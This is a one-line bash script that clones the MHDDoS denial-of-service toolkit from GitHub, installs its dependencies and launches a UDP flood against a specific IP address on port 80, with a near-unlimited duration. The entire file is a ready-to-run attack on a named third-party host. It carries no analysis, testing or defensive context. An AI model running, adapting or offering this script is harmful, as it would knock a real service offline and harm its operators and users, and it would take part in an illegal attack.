#!/bin/bash

git clone https://github.com/MatrixTM/MHDDoS.git && cd MH* && pip3 install -r requirements.txt && python3 start.py UDP 193.32.149.118:80 10 99999999 true
